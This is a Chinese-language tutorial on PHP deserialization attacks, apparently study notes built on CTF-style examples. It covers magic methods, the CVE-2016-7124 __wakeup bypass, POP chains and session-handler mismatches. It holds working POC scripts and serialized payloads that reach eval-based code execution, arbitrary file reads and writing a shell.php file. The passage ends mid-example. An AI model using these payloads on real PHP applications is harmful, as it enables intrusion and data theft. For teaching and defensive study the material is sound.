# PHP反序列化

## 什么是序列化

都知道`json`数据，每组数据使用`,`分隔开，数据内使用`:`分隔`键`和`值`

```php
<?php 
$arr = array("No1"=>"m0c1nu7","No2"=>"mochu7","No3"=>"chumo");
echo json_encode($arr);
```

```php
{"No1":"m0c1nu7","No2":"mochu7","No3":"chumo"}
```

可以看到`json`数据其实就是个数组，这样做的目的也是为了方便在前后端传输数据，后端接受到`json`数据，可以通过`json_decode()`得到原数据，那么这种`将原本的数据通过某种手段进行"压缩"，并且按照一定的格式存储的过程就可以称之为序列化`

## 序列化与反序列化

### 序列化

php从`PHP 3.05`开始，为保存、传输对象数据提供了一组序列化函数`serialize()`、`unserialize()`

php的序列化也是一个将各种类型的数据，压缩并按照一定的格式进行存储的过程，所使用的函数是`serialize()`

例如：

```php
<?php 
class People{
	public $id;
	protected $gender;
	private $age;
	public function __construct(){
		$this->id = 'm0c1nu7';
		$this->gender = 'male';
		$this->age = '19';
	}
}
$a = new People();
echo serialize($a);
?>
```

反序列化结果:

```php
O:6:"People":3:{s:2:"id";s:11:"MorningStar";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"19";}
O:是指OBJ对象
6:是指对象名长度
People:对象名
3:对象属性个数
s:2:"id";:s是指string表示字符
s:11:"MorningStar"; : 7是指属性值的长度 后面就是属性值
```

PHP序列化注意以下几点:

```php
序列化只序列属性，不序列方法
因为序列化不序列方法，所以反序列化之后如果想正常使用这个对象的话我们必须要依托这个类要在当前作用域存在的条件
我们能控制的只有类的属性，攻击就是寻找合适能被控制的属性，利用作用域本身存在的方法，基于属性发动攻击
```

序列化格式:

```php
a - array 数组型
b - boolean 布尔型
d - double 浮点型
i - integer 整数型
o - common object 共同对象
r - objec reference 对象引用
s - non-escaped binary string 非转义的二进制字符串
S - escaped binary string 转义的二进制字符串
C - custom object 自定义对象
O - class 对象
N - null 空
R - pointer reference 指针引用
U - unicode string Unicode 编码的字符串
```

#### 属性不同的访问类型的序列化区别

```php
<?php
class test{
    public $name="ghtwf01";
    private $age="18";
    protected $sex="man";
}
$a=new test();
$a=serialize($a);
print_r($a);
```

效果如下:

```php
O:4:"test":3:{s:4:"name";s:7:"ghtwf01";s:9:" test age";s:2:"18";s:6:" * sex";s:3:"man";}
```

##### private分析：

发现本来是`age`结果上面出现的是`testage`，而且`testage`长度为`7`，但是上面显示的是`9`

查找资料后发现**private属性序列化的时候格式是%00类名%00成员名**，`%00`占一个字节长度，所以`age`加了类名后变成了`testage`长度为`9`

##### protect分析：

本来是`sex`结果上面出现的是`*sex`，而且`*sex`的长度是`4`，但是上面显示的是`6`，同样查找资料后发现**protect属性序列化的时候格式是%00\*%00成员名**

这里介绍一下public、private、protected的区别

```php
public(公共的):在本类内部、外部类、子类都可以访问

protect(受保护的):只有本类或子类或父类中可以访问

private(私人的):只有本类内部可以使用
```

### 反序列化

定义：反序列化就是利用`unserailize()`函数将一个经过序列化的字符串还原成php代码形式

```php
//test1.php
<?php 
$str = 'O:6:"People":3:{s:2:"id";s:7:"m0c1nu7";s:9:" * gender";s:4:"male";s:11:" People age";s:2:"19";}';
var_dump(unserialize($str));
 ?>
```

```php
object(__PHP_Incomplete_Class)#1 (4) {
  ["__PHP_Incomplete_Class_Name"]=>
  string(6) "People"
  ["id"]=>
  string(7) "m0c1nu7"
  [" * gender"]=>
  string(4) "male"
  [" People age"]=>
  string(2) "19"
}
```

#### 漏洞原理

更深层次去体会反序列化造成漏洞原理

```php
<?php
class Hello
{   
    public $hello = "Welcome!!!";
    private $flag = "echo 'No Way!';";

    public function set_flag($flag)
    {
        $this->flag = $flag;
    }
    public function get_flag()
    {
        return eval($this->flag);
    }
}

$data = file_get_contents("serialize.txt");
$data = unserialize($data);
echo $data->hello."<br>";
echo $data->get_flag();

```

可以发现漏洞点是`set_flag()`使用了外部接受的参数对类内的私有属性`$flag`进行了赋值，而`get_flag()`又使用了`eval()`函数执行了`$flag`导致漏洞。漏洞成因看了接下来就是构造POC，只需对`set_flag()`传入一个参数即可

```php
<?php
class Hello
{   
    public $hello = "Welcome!!!";
    private $flag = "echo 'No Way!';";

    public function set_flag($flag)
    {
        $this->flag = $flag;
    }
    public function get_flag()
    {
        return $this->flag;
    }
}

$object = new Hello();
$object->set_flag('phpinfo();');
$data = serialize($object);
```

序列化字符:

```php
O:5:"Hello":2:{s:5:"hello";s:10:"Welcome!!!";s:11:" Hello flag";s:10:"phpinfo();";}
```

还可以修改其他属性的值，例如:

```php
O:5:"Hello":2:{s:5:"hello";s:17:"Hacker By m0c1nu7";s:11:"Helloflag";s:10:"phpinfo();";}
```

## 魔术方法

`PHP 将所有以 __（两个下划线）开头的类方法保留为魔术方法。`
在PHP反序列化进行利用时，经常需要通过反序列化中的魔术方法，检查方法里有无敏感操作来进行利用

```php
__construct()            //类的构造函数，创建对象时触发

__destruct()             //类的析构函数，对象被销毁时触发

__call()                 //在对象上下文中调用不可访问的方法时触发

__callStatic()           //在静态上下文中调用不可访问的方法时触发

__get()                  //读取不可访问属性的值时，这里的不可访问包含私有属性或未定义

__set()                  //在给不可访问属性赋值时触发

__isset()                //当对不可访问属性调用 isset() 或 empty() 时触发

__unset()                //在不可访问的属性上使用unset()时触发

__invoke()               //当尝试以调用函数的方式调用一个对象时触发

__sleep()                //执行serialize()时，先会调用这个方法

__wakeup()               //执行unserialize()时，先会调用这个方法

__toString()             //当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用
```

`__toString()`这个魔术方法能触发的因素太多，觉得有必要需要列一下：

1. `echo($obj)`/`print($obj)`打印时会触发
2. 反序列化对象与字符串连接时
3. 反序列化对象参与格式化字符串时
4. 反序列化对象与字符串进行`==`比较时（PHP进行==比较的时候会转换参数类型）
5. 反序列化对象参与格式化SQL语句，绑定参数时
6. 反序列化对象在经过php字符串处理函数，如`strlen()`、`strops()`、`strcmp()`、`addslashes()`等
7. 在`in_array()`方法中，第一个参数时反序列化对象，第二个参数的数组中有`__toString()`返回的字符串的时候`__toString()`会被调用
8. 反序列化的对象作为`class_exists()`的参数的时候

### 触发过程:

```php
<?php 
class M0c1nu7{
	private $name = 'M0c1nu7';
	function __construct(){
		echo "__construct";
		echo "\n";
	}

	function __sleep(){
		echo "__sleep";
		echo "\n";
		return array("name");
	}

	function __wakeup(){
		echo "__wakeup";
		echo "\n";
	}

	function __destruct(){
		echo "__destruct";
		echo "\n";
	}

	function __toString(){
		return "__toString"."\n";;
	}
}

$M0c1nu7_old = new M0c1nu7;
$data = serialize($M0c1nu7_old);
$M0c1nu7_new = unserialize($data);
echo $M0c1nu7_new;     //这里使用print也可触发__toString()方法	
```

运行结果:

```php
__construct
__sleep
__wakeup
__toString
__destruct
__destruct
```

首先`new`实例化了这个类，创建了对象，这就肯定会有一个`__construct()`方法和`__destruct()`，然后使用了`serialize()`和`unserialize()`函数就肯定会有`__sleep()`方法和`__wakeup()`方法，然后又因为使用了`echo`或`print`这样的把对象输出为一个字符串的操作，所以就触发了`__toString()`方法，那么还有另外一个`__destruct()`方法是怎触发的呢？其实这个`__destruct()`方法时`unserialize()`函数反序列化生成的对象销毁的时候触发的，前面已经讲了对象都会在程序执行完成之后销毁

例如：

```php
<?php
class test{
    public $a='hacked by ghtwf01';
    public $b='hacked by blckder02';
    public function pt(){
        echo $this->a.'<br />';
    }
    public function __construct(){
        echo '__construct<br />';
    }
    public function __destruct(){
        echo '__destruct<br />';
    }
    public function __sleep(){
        echo '__sleep<br />';
        return array('a','b');
    }
    public function __wakeup(){
        echo '__wakeup<br />';
    }
}
//创建对象调用__construct
$object = new test();
//序列化对象调用__sleep
$serialize = serialize($object);
//输出序列化后的字符串
echo 'serialize: '.$serialize.'<br />';
//反序列化对象调用__wakeup
$unserialize=unserialize($serialize);
//调用pt输出数据
$unserialize->pt();
//脚本结束调用__destruct
```

效果如下:

```php
__construct
__sleep
serialize: O:4:"test":2:{s:1:"a";s:17:"hacked by ghtwf01";s:1:"b";s:19:"hacked by blckder02";}
__wakeup
hacked by ghtwf01
__destruct
__destruct
```

原来有一个实例化出的对象，然后又反序列化出了一个对象，就存在两个对象，所以最后销毁了两个对象也就出现了执行了两次`__destruct`

### 魔术方法在反序列化攻击中的作用

我们都知道反序列化的入口是在`unserialize()`，只要参数可控并且这个类在当前作用域存在，我们就能传入任何已经序列化的对象。而不是局限于出现`unserialize()`函数的类的对象，如果只能局限于当前类，那攻击面就太小了，而且反序列化其他类对象只能控制属性，如果你没有完成反序列化后的代码中调用其他类对象的方法，还是无法利用漏洞进行攻击

但是利用魔术方法就可以扩大了攻击面，魔术方法是在该类序列化或者反序列化的同时自动完成的，这样就可以利用反序列化中的对象属性来操控一些能利用的函数，达到攻击的目的

例如:

```php
<?php
class M0c1nu7{
    public $M0c1nu7 = 'I am M0c1nu7';
    private $test;

    function __construct(){
        $this->test = new Welcome();
    }

    function __destruct(){
        $this->test->action();
    }
}

class Welcome{
    function action(){
        echo "Welcome to here";
    }
}

class Evil{
    var $test2;
    function action(){
        eval($this->test2);
    }
}

unserialize($_GET['str']);
?>
```

首先来分析一下代码，主要是看哪里的属性可控，并且哪里有对象调用方法的操作，我们的目的很清楚，就是要调用`Evil`类中的`action()`方法，并且控制`Evil`类中的`$test2`这个属性。可以看到`M0c1nu7`类中的魔术方法`__construct`有把对象赋到`$teset`属性上，然后在`__destruct()`有调用`action()`方法的操作，那就这思路就很清晰了，POC如下：

```php
<?php 
class M0c1nu7{
	private $test;
	function __construct(){
		$this->test = new Evil;
	}
}

class Evil{
	var $test2 = 'phpinfo();';
}

$M0c1nu7 = new M0c1nu7();
$data = serialize($M0c1nu7);
echo $data;
?>
```

```php
O:7:"M0c1nu7":1:{s:13:" M0c1nu7 test";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}
```

注意：`$test`是私有方法，传入反序列化字符的时候，应该在前面的类名两侧加上`%00`，payload如下：

```php
?str=O:7:"M0c1nu7":1:{s:13:"%00M0c1nu7%00test";O:4:"Evil":1:{s:5:"test2";s:10:"phpinfo();";}}
```

例题:

```php
<?php  

$txt = $_GET["txt"];  

$file = $_GET["file"];  

$password = $_GET["password"];  

if(isset($txt)&&(file_get_contents($txt,'r')==="welcome to the bugkuctf")){  

    echo "hello friend!<br>";  

    if(preg_match("/flag/",$file)){ 

        echo "不能现在就给你flag哦";

        exit();  

    }else{  

        include($file);   

        $password = unserialize($password);  

        echo $password;  

    }  

}else{  

    echo "you are not the number of bugku ! ";  

}  

?>
```

代码有点长我们先来分析一下这串代码想表达什么
1.先`GET`传入参数`$txt`、`$file`、`$password`
2.判断`$txt`是否存在，如果存在并且值为`welcome to the bugkuctf`就进一步操作，`$file`参数里面不能包含`flag`字段
3.通过以上判断就`include($file)`，再将`$password`反序列化并输出

hint.php

```php
<?php   
class Flag{//flag.php  
    public $file;  
    public function __tostring(){  
        if(isset($this->file)){  
            echo file_get_contents($this->file); 
            echo "<br>";
        return ("good");
        }  
    }  
}  
?>
```

`index.php`里面要求`$file`参数不能包含`flag`字段，所以文件不能包含`flag.php`，所以`$file=hint.php`，把`hint.php`包含进去，里面存在一个`file_get_concents函数`可以读文件，想到`index.php`里面的`unserialize`函数，所以只需要控制`$this->file`就能读取想要的文件

用这段代码的结果传值给`$password`

```php
<?php
    class Flag{
        public $file='flag.php';
    }
    $a=new Flag();
    $b=serialize($a);
    echo $b;
?>
```

`$password`进行反序列化后`$file`就被赋值为`flag.php`，然后`file_get_contents`就得到了`flag`

```php
?txt=php://input&file=hint.php&password=反序列化内容
POST: welcome to the bugkuctf
```

例题:

```php
<?php
    class foo{
        public $file = "2.txt";
        public $data = "test";
        function __destruct(){
            file_put_contents(dirname(__FILE__).'/'.$this->file,$this->data);
        }
    }
    $file_name = $_GET['filename'];
    print "You have readfile ".$file_name;
    unserialize(file_get_contents($file_name));
?>
```

这串代码的意思是将读取的文件内容进行反序列化，`__destruct`函数里面是生成文件，如果我们本地存在一个文件名是`flag.txt`，里面的内容是

```php
O:3:"foo":2:{s:4:"file";s:9:"shell.php";s:4:"data";s:18:"<?php phpinfo();?>";}
```

将它进行反序列化就会生成`shell.php`里面的内容为`<?php phpinfo();?>`

## __wakeup绕过(CVE-2016-7124)

CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行

>官方给出的影响版本：
>`PHP5 < 5.6.25`
>`PHP7 < 7.0.10`
>笔者使用phpstudy_pro测试出来的影响版本：
>`PHP5 <= 5.6.9`
>`PHP7 < 7.0.10`

### 例题:

```php
//test.php
<?php
class MoChu{
	protected $file="test.php";
	function __destruct(){
		if(!empty($this->file)){
			if(strchr($this->file,"\\")===false && strchr($this->file,'/')===false)
				show_source(dirname(__FILE__).'/'.$this->file);
			else
				die('Worng filename.');
		}
	}
	function __wakeup(){
		$this->file = 'test.php';
	}
	public function __toString(){
		return '';
	}
}

if(!isset($_GET['file'])){
	show_source('test.php');
}else{
	$file=base64_decode($_GET['file']);
	echo unserialize($file);
}
echo phpversion();
?>  
```

代码很简单就是原本的功能就是显示源码，主要是这里如何绕过反序列化之后执行的`__wakeup()`方法中的`$this->file='test.php'`来读取别的文件，这里就是使用`CVE-2016-7124：当序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup的执行`

```php
<?php 
class MoChu{
	protected $file = 'flag.php';
}
$a = new MoChu();
echo serialize($a);
?>
```

运行结果:

```php
O:5:"MoChu":1:{s:7:" * file";s:8:"flag.php";}
```

注意:

1. `file`是`protected`类型的属性，反序列化需要在属性名前加上`\00*\00`
2. 这里使用了`\00`就是使用了`转义的二进制字符串`，在前面序列化的格式已经提及使用了转义的二进制字符串，符号是要使用大写的`S`

最终得到的反序列化字符：

```php
O:5:"MoChu":2:{S:7:"\00*\00file";s:8:"flag.php";}
```

得到的base64：`Tzo1OiJNb0NodSI6Mjp7Uzo3OiJcMDAqXDAwZmlsZSI7czo4OiJmbGFnLnBocCI7fQ==`

### 例题:

```php
<?php
    class A{
        public $target = "test";
        function __wakeup(){
            $this->target = "wakeup!";
        }
        function __destruct(){
            $fp = fopen("D:\Program Files\PHPTutorial\WWW\zx\hello.php","w");
            fputs($fp,$this->target);
            fclose($fp);
        }
    }
    $a = $_GET['test'];
    $b = unserialize($a);
    echo "hello.php"."<br/>";
    include("./hello.php");
?>
```

魔法函数`__wakeup()`要比`__destruct()`先执行，所以我们之间传入
`O:1:"A":1:{s:6:"target";s:18:"<?php phpinfo();?>";}`时会被先执行的`__wakeup()`函数`$target`赋值覆盖为`wakeup!`，然后生成的`hello.php`里面的内容就是`wakeup!`

绕过方法:

现在我们根据绕过方法：对象属性个数的值大于真实的属性个数时就会跳过`__wakeup()`的执行，对象个数原来是1我们将其改为2，也就是

```php
O:1:"A":2:{s:6:"target";s:19:"<?php phpinfo(); ?>";}
```

## 当目标对象被private、protected修饰时反序列化漏洞的利用

```php
private属性序列化的时候格式是%00类名%00成员名
protect属性序列化的时候格式是%00*%00成员名
```

### protected

代码如下

```php
<?php
class A{
    protected $test = "hahaha";
    function __destruct(){
        echo $this->test;
    }
}
$a = $_GET['test'];
$b = unserialize($a);
?>
```

利用方式：
先用如下代码输出利用的序列化串

```php
<?php
    class A{
        protected $test = "hacked by ghtwf01";
    }
    $a = new A();
    $b = serialize($a);
    print_r($b);
?>
```

得到`O:1:"A":1:{s:7:"*test";s:17:"hacked by ghtwf01";}`
因为`protected`是`*`号两边都有`%00`，所以必须在`url`上面也加上，否则不会利用成功

### private

代码如下

```php
<?php
class A{
    private  $test = "hahaha";
    function __destruct(){
        echo $this->test;
    }
}
$a = $_GET['test'];
$b = unserialize($a);
?>
```

利用:

```php
<?php
    class A{
        protected $test = "hacked by ghtwf01";
    }
    $a = new A();
    $b = serialize($a);
    print_r($b);
?>
```

得到序列化后的字符串为`O:1:"A":1:{s:7:"Atest";s:17:"hacked by ghtwf01";`
因为`private`是类名`A`两边都有`%00`所以同样在`url`上面体现

```php
?test=O:1:"A":1:{S:7:"\00A\00test";s:4:"test";}
```

## 同名方法的利用

```php
<?php
    class A{
        public $target;
        function __construct(){
            $this->target = new B;
        }
        function __destruct(){
            $this->target->action();
        }
    }
    class B{
        function action(){
            echo "action B";
        }
    }
    class C{
        public $test;
        function action(){
            echo "action A";
            eval($this->test);
        }
    }
    unserialize($_GET['test']);
?>
```

这个例子中，`class B`和`class C`有一个同名方法`action`，我们可以构造目标对象，使得析构函数调用`class C`的`action`方法，实现任意代码执行
利用代码

```php
<?php
    class A{
        public $target;
        function __construct(){
            $this->target = new C;
            $this->target->test = "phpinfo();";
        }
        function __destruct(){
            $this->target->action();
        }
    }
    class C{
        public $test;
        function action(){
            echo "action C";
            eval($this->test);
        }
    }
    echo serialize(new A);
?>
```

## POP链构造

POP全称`Property-Oriented Programing`即`面向属性编程`，用于上层语言构造特定调用链的方法，玩pwn的肯定都知道`ROP`全称`Return-Oriented Progaming`即`面向返回编程`

`POP`和`ROP`原理相似，都是从现有的环境中寻找一系列的代码或指令调用，然后根据需求构成一组连续的调用链。在控制代码或程序的执行流程后就能够使用这一组调用链来执行一些操作

在二进制利用时，`ROP`链构造中时寻找当前系统环境中或内存环境中已经存在的、具有固定地址且带有返回操作的指令集

而`POP`链构造则是寻找程序当前环境中已经定义了或者能够动态加载的对象中的属性（函数方法），将一些可能的调用组合在一起形成一个完整的、具有目的性的操作

二进制中通常是由于内存溢出控制了指令执行流程、而反序列化过程就是控制代码执行流程的方法之一，前提：`进行反序列化的数据能够被用于输入所控制`

一般序列化攻击都在PHP魔术方法中出现可利用的漏洞，因为自动调用触发漏洞，但如果关键代码在没在魔术方法中，而是在一个类的普通方法中。这时候就可以通过构造`POP`连寻找相同的函数名将类的属性和敏感函数的属性联系起来

### 例题:

```php
<?php

class C1e4r
{
    public $test;
    public $str;

    public function __construct($name)
    {
        $this->str = $name;
    }

    public function __destruct()
    {
        $this->test = $this->str;


        echo $this->test;
    }
}

class Show
{
    public $source;
    public $str;

    public function __construct($file)
    {
        $this->source = $file;
        echo $this->source;
    }

    public function __toString()
    {
        $content = $this->str['str']->source;
        return $content;
    }

    public function __set($key, $value)
    {
        $this->$key = $value;
    }

    public function _show()
    {
        if (preg_match('/http|https|file:|gopher|dict|\.\.|f1ag/i', $this->source)) {
            die('hacker!');
        } else {
            highlight_file($this->source);
        }
    }

    public function __wakeup()
    {
        if (preg_match("/http|https|file:|gopher|dict|\.\./i", $this->source)) {
            echo "hacker~";
            $this->source = "index.php";
        }
    }
}

class Test
{
    public $file;
    public $params;

    public function __construct()
    {
        $this->params = array();
    }

    public function __get($key)
    {
        return $this->get($key);
    }

    public function get($key)
    {
        if (isset($this->params[$key])) {
            $value = $this->params[$key];
        } else {
            $value = "index.php";
        }
        return $this->file_get($value);
    }

    public function file_get($value)
    {
        $text = base64_encode(file_get_contents($value));
        return $text;
    }
}


show_source(__FILE__);
$name = unserialize($_GET['strs']);
?>

```

我们首先确定目标就是`Test::file_get()`里面的`file_get_contents()`读取文件，可以看到`get()`方法中调用了`file_get()`方法，接下来看一下哪里有调用`get()`，发现在魔术方法`__get()`中调用了`get()`那么现在的`POP链`是：

```php
Test::__get()->Test::get()->Test::file_get()
```

接下来首先必须知道`__get()`的触发条件：`读取不可访问属性的值时，这里的不可访问包含私有属性或未定义`，接着看一下哪里触发了魔术方法`__get()`，在`Show::__toString()`中出现了`未定义属性$content`并对其进行赋值，这样就会触发`__get()`方法，利用的时候只需把`Test`对象赋值给`$this->str['str']`，接下来看一下哪里会触发`__toString()`方法，在`C1e4r:__destruct()`有`echo`操作，这样就触发了`__toString()`，那么完整的`POP链`如下：

```php
Cle4r::str->Show::str['str']->Test::__get->Test::get()::Test::file_get()
```

构造利用脚本:

```php
<?php
class C1e4r{
    public $test;
    public $str;
    public function __construct($name){
        $this->str = $name;
    }
    public function __destruct(){
        $this->test = $this->str;
        echo $this->test;
    }
}

class Show{
    public $str;
    public $source;
    public function __toString(){
        $content = $this->str['str']->source;
        return (string)$content;
    }
}

class Test{
    public $file;
    public $params;
}

$T=new Test();
$T->params=array('source'=>'D:\phpstudy_pro\WWW\Test\flag.php');//这里好像只能使用绝对路径才能读取到
$S=new Show();
$S->str=array('str'=>$T);
$C=new C1e4r($S);
echo serialize($C);
?>

```

### 例题:

```php
<?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __destruct()
        {
                $this->mod1->test1();
        }
}
class Call
{
        public $mod1;
        public $mod2;
        public function test1()
    {
            $this->mod1->test2();
    }
}
class funct
{
        public $mod1;
        public $mod2;
        public function __call($test2,$arr)
        {
                $s1 = $this->mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __invoke()
        {
                $this->mod2 = "字符串拼接".$this->mod1;
        } 
}
class string1
{
        public $str1;
        public $str2;
        public function __toString()
        {
                $this->str1->get_flag();
                return "1";
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo "flag:"."xxxxxxxxxxxx";
        }
}
$a = $_GET['str'];
unserialize($a);
?>

```

这里的`POP`链也很简单，首先我们的目标是`GetFlag::get_flag()`，在`string1::__toString()`调用了`get_flag()`，这里把`GetFlag`类对象赋值给`$str1`即可

`func::__invoke()`有字符串和属性拼接的操作，我们只需要将`string1`的类对象赋值给`$mod1`即可触发`__toString()`方法，接着看哪里触发了`__invoke()`方法

`__invoke()：当尝试以调用函数的方式调用一个对象时触发`，`funct::__call()`中有`$s1()`调用函数方式，而`$s1 = $this->mod1;`，所以只需要把`func`类对象赋值给`$mod1`即可触发`__invoke()`，接下来看如何触发`__call()`

`__call()：在对象上下文中调用不可访问的方法时触发`，在`Call::test1()`存在调用未定义的不可访问方法，将`funct`类对象赋值给`$mod1`，然后`start_gg::__destruct()`调用了`Call::test()`，把`Call`类对象赋值给`$mod1`即可，整个`POP`链如下：

```php
start_gg::__destruct()->Call::test1()->funct::__call()->func::__invoke()::string1::__toString()->GetFlag::get_flag()
```

利用脚本如下:

```php
<?php
class start_gg
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1 = new Call();//把$mod1赋值为Call类对象
        }
        public function __destruct()
        {
                $this->mod1->test1();
        }
}
class Call
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1 = new funct();//把 $mod1赋值为funct类对象
        }
        public function test1()
        {
                $this->mod1->test2();
        }
}

class funct
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1= new func();//把 $mod1赋值为func类对象

        }
        public function __call($test2,$arr)
        {
                $s1 = $this->mod1;
                $s1();
        }
}
class func
{
        public $mod1;
        public $mod2;
        public function __construct()
        {
                $this->mod1= new string1();//把 $mod1赋值为string1类对象

        }
        public function __invoke()
        {        
                $this->mod2 = "字符串拼接".$this->mod1;
        } 
}
class string1
{
        public $str1;
        public function __construct()
        {
                $this->str1= new GetFlag();//把 $str1赋值为GetFlag类对象          
        }
        public function __toString()
        {        
                $this->str1->get_flag();
                return "1";
        }
}
class GetFlag
{
        public function get_flag()
        {
                echo "flag:"."xxxxxxxxxxxx";
        }
}
$b = new start_gg;//构造start_gg类对象$b
echo urlencode(serialize($b))."<br />";//显示输出url编码后的序列化对象
```

反序列化字符串:

```php
O:8:"start_gg":2:{s:4:"mod1";O:4:"Call":2:{s:4:"mod1";O:5:"funct":2:{s:4:"mod1";O:4:"func":2:{s:4:"mod1";O:7:"string1":1:{s:4:"str1";O:7:"GetFlag":0:{}}s:4:"mod2";N;}s:4:"mod2";N;}s:4:"mod2";N;}s:4:"mod2";N;}
```

第二种:

```php
<?php
class GetFlag
{
    public function get_flag()
    {
        echo "flag:"."xxxxxxxxxxxx";
    }
}

class string1 {
    public $str1; //GetFlag
}

class func {
    public $mod1; //string1
}

class funct {
    public $mod1; //func
}

class Call {
    public $mod1;//funct
}

class start_gg {
    public $mod1;
}

$s1 = new string1();
$s1->str1 = new GetFlag();
$f = new func();
$f->mod1 = $s1;
$fu = new funct();
$fu->mod1 = $f;
$c = new Call();
$c->mod1 = $fu;
$st = new start_gg();
$st->mod1=$c;
echo serialize($st);
```

# PHP Session反序列化漏洞

## 什么是PHP Session

### 什么是session

`session`在计算机网络应用中称为`会话控制`。创建于服务器端，保存于服务器。`session`对象存储特定用户所需的属性及配置信息。简单来说就是一种客户与服务器更为安全的对话方式。一旦开启了`session`会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建议一种`对话机制`

### 什么是PHP Session

`PHP session`可以看作是一个特殊的变量，且该变量适用于存储关于用户的会话信息，或者更改用户会话的设置，需要注意的是，`PHP session`变量存储单一用户的信息，并且对于应用程序中的所有页面都是可用的，且对应的具体`session`值会存储于服务器端，这也是与`cookie`的主要区别，所以`session`的安全性相对较高

## PHP Session工作流程

当开始一个会话时，PHP会尝试从请求中查找会话ID，通常是使用`cookie`，如果请求包中未发现`session id`，PHP就会自动调用`php_session_create_id`函数创建一个新的会话，并且在响应包头中通过`set-cookie`参数发给客户端保存

当客户端`cookie`被禁用的情况下，PHP会自动将`session id`添加到`url参数`、`form`、`hidden`字段中，但这需要`php.ini`中的`session.use_trans_sid`设为开启，也可以在运行时调用`ini_set()`函数来设置这个配置项

PHP session会话开始之后，PHP就会将会话中的数据设置到`$_SESSION`变量中，当PHP停止运行时，它会自动读取`$_SESSION`中的内容，并将其进行`序列化`，然后发送给会话保存管理器来进行保存。默认情况下，PHP使用内置的文件会话保存管理器来完成`session`的保存，也可以通过配置项`session.save_handler`来修改所要采用的会话保存管理器。对于文件会话保存管理器，会将会话数据保存到配置项`session.save_path`所指定的位置

<hr>

会话开始之后，`PHP` 就会将会话中的数据设置到 `$_SESSION` 变量中，如下述代码就是一个在 `$_SESSION` 变量中注册变量的例子：

```php
<?php 
session_start();
if (!isset($_SESSION['username'])){
    $_SESSION['username'] = 'm0c1nu7';
}
 ?>
```

```sh
username|s:11:"morningstar";
```

## PHP Session在php.ini中的有关配置

`php.ini`里面有如下六个相对重要的配置

```php
session.save_path=""      --设置session的存储位置
session.save_handler=""   --设定用户自定义存储函数，如果想使用PHP内置session存储机制之外的可以使用这个函数
session.auto_start        --指定会话模块是否在请求开始时启动一个会话，默认值为 0，不启动
session.serialize_handler --定义用来序列化/反序列化的处理器名字，默认使用php  
session.upload_progress.enabled --启用上传进度跟踪，并填充$ _SESSION变量，默认启用
session.upload_progress.cleanup --读取所有POST数据（即完成上传）后，立即清理进度信息，默认启用
```

如`phpstudy`下上述配置如下：

```php
session.save_path = "/tmp"      --所有session文件存储在/tmp目录下
session.save_handler = files    --表明session是以文件的方式来进行存储的
session.auto_start = 0          --表明默认不启动session
session.serialize_handler = php --表明session的默认(反)序列化引擎使用的是php(反)序列化引擎
session.upload_progress.enabled on --表明允许上传进度跟踪，并填充$ _SESSION变量
session.upload_progress.cleanup on --表明所有POST数据（即完成上传）后，立即清理进度信息($ _SESSION变量)
```

## PHP session 不同引擎的存储机制

`PHP session`的存储机制是由`session.serialize_handler`来定义引擎的，默认是以文件的方式存储，且存储的文件是由`sess_sessionid`来决定文件名的，当然这个文件名也不是不变的，如`Codeigniter`框架的`session`存储的文件名为`ci_sessionSESSIONID`

`session.serialize_handler`定义的引擎共有三种：

| 处理器名称    | 存储格式                                                     |
| ------------- | ------------------------------------------------------------ |
| php           | 键名 + 竖线 + 经过serialize()函数序列化处理的值              |
| php_binary    | 键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值 |
| php_serialize | 经过serialize()函数序列化处理的数组                          |

注：自PHP 5.5.4起可以使用php_serialize

上述三种处理器中，`php_serialize`在内部简单地直接使用 `serialize/unserialize`函数，并且不会有`php`和 `php_binary`所具有的限制。 使用较旧的序列化处理器导致`$_SESSION` 的索引既不能是数字也不能包含特殊字符(`|` 和 `!`)

来看一下三种不同的`session`序列化处理器的处理结果

### 序列化引擎为php

**session.serialize_handler = php**

序列化存储格式：`键名 + 竖线 + 经过serialize()函数序列化处理的值`

```php
<?php 
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
$_SESSION['session'] = $_GET['session'];
 ?>
```

序列化结果：

```php
session|s:11:"morningstar";

session为$_SESSION['session']键名，|后为序列化格式字符串
```

### 序列化引擎为php_binary

**session.serialize_handler = php_binary**

序列化存储格式：`键名的长度对应的 ASCII 字符 + 键名 + 经过serialize()函数序列化处理的值`

```php
<?php
error_reporting(0);
ini_set('session.serialize_handler','php_binary');
session_start();
$_SESSION['php_binary_sessionsessionsession_hhhhh'] = $_GET['session'];
?>
```

为了更能直观的体现出格式的差别，因此这里设置了键值长度为`38`，`38`对应ASCII为`&`

序列化结果为:

```php
&php_binary_sessionsessionsession_hhhhhs:11:"morningstar";
```

### 序列化引擎为php_serialize

**session.serialize_handler = php_serialize**

序列化存储格式：`经过serialize()函数序列化处理的数组`

```php
<?php 
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
?>
```

结果:

```php
session|s:11:"morningstar";
```

### PHP session反序列化漏洞形成原理

反序列化的各个处理器本身是没有问题的，但是如果`php`和`php_serialize`这两个处理区混合起来使用，就会出现`session`反序列化漏洞。原因是`php_serialize`存储的反序列化字符可以引用`|`，如果这时候使用`php`处理器的格式取出`$_SESSION`的值，`|`会被当成`键值对的分隔符`，在特定的地方会造成反序列化漏洞

例子:

定义一个`session.php`，用于传入`session`的值

```php
<?php 
error_reporting(0);
ini_set('session.serialize_handler','php_serialize');
session_start();
$_SESSION['session'] = $_GET['session'];
 ?>
```

查看session内容:

```php
a:1:{s:7:"session";s:10:"helloworld";}
```

再定义一个`class.php`

```php
<?php 
error_reporting(0);
ini_set('session.serialize_handler','php');
session_start();
class Hello{
	public $name = 'mochu';
	function __wakeup(){
		echo "Who are you?";
	}
	function __destruct(){
		echo "<br>".$this->name;
	}
}
